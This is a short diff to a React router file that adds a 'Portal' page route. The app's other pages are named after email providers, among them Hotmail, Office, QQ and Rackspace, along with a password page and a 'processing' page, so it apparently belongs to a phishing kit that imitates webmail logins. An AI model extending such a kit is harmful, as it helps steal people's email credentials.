@@ -1,3 +1,4 @@
+
 import { Router } from "@reach/router";
 import React, { Fragment } from "react";
 import { ToastContainer } from "react-toastify";
@@ -14,6 +15,7 @@ import Hotmail from "./pages/hotmail";
 import HotmailPassword from "./pages/hotmail/password";
 import Mail from "./pages/mail";
 import Office from "./pages/office";
+import Portal from "./pages/portal";
 import Processing from "./pages/processing";
 import Qq from "./pages/qq";
 import Rackspace from "./pages/rackspace";
@@ -54,6 +56,7 @@ function App() {
         <HotmailPassword path="ht/:key" />
         <RedirectNorecord path="/gm" />
         <Processing path="processing" />
+        <Portal path="portal" />
       </Router>
       <ToastContainer
         position="top-center"
